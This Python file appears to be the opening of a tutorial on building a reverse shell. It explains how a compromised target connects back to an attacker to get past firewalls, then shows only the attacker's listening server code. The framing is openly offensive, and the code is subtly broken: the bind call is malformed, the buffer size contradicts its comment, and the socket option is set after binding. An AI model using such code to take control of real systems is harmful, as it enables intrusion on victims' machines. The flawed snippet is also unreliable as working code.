"""
There are many ways to gain control over a compromised system. A common practice
is to gain interactive access, which enables you to try and gain complete ontrol of the OS

However most firewalls block most remote connections. On e of the method to bypass this is to use reverse shell


a reverse shell is a program that executes local cmd.exe(for Windows) or bash/zsh(for Unix-like) commands and sends output to
a remote machine

with a reverse shell the target machine initiates the connection to the attcker machine
and the attacker machine listens for incoming connections on a specified port, bypassing firewalls


the basic idea of the code we will implement is that the attacker machine will keep
listening for connections. Once the target machines connects, the server will send
shell commands to the target machine and expect output results
"""



# server code

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1268# 128KB mas size of messages, feel free to increase

# separator string for semding 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind(SERVER_HOST, SERVER_PORT)

"""LISTENING CONNECTIONS"""
# Make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will arise

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)

print(f"Listening as {SERVER_HOST}:{SERVER_PORT}")

"""
I have used 0.0.0.0 as the server IP Address: this means all IPv4 addresses on a local machine

"""